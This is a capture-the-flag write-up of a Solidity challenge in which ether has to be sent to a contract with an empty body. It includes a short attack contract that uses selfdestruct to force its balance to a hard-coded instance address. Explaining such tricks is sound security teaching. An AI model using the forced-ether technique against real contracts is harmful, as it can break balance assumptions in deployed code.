**Description**

In this challenge, we are presented with a contract that has neither a fallback function nor a receive function; in fact,  the contract does not have any code in its body whatsoever, The challenge is to send ether to this contract, as we know that for a smart contract written in Solidity to receive ether, it requires the payable modifier on the function; without it, the EVM will throw an error.If plain ether is sent to a contract, the fallback function handles the transaction. Its default behavior is to throw to prevent accidentally sending ether to a contract. Any transaction that sends ether to its address will fail without a payable decorator. However, this is misleading since `selfdestruct` moves all the contract's balance to the other contract without triggering the fallback method, and that's exactly what we're going to exploit in this challenge.

* Force.sol
```solidity=
pragma solidity ^0.4.18;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

**Attack Scenario**

First, after getting a new instance of the `Force` contract and getting the instance's address, we are going to implement a new contract that receives eth and calls `selfdestruct` with the address of the instance in the args; this will force any owned assets into that contract. Let's see what the code looks like:
- **Attack.sol**
```solidity=
pragma solidity 0.8.0;

contract Attack {
    function attackhh() external
    {
        selfdestruct(payable(0xb897C89af48D717adFa5928c687B9091f468c740));
    }
    receive() payable external{}
}
```

Running the `attackhh` function after funding the attack contract will send ETH to the instance's contract without the need of the "fallback" or the `receive` methods.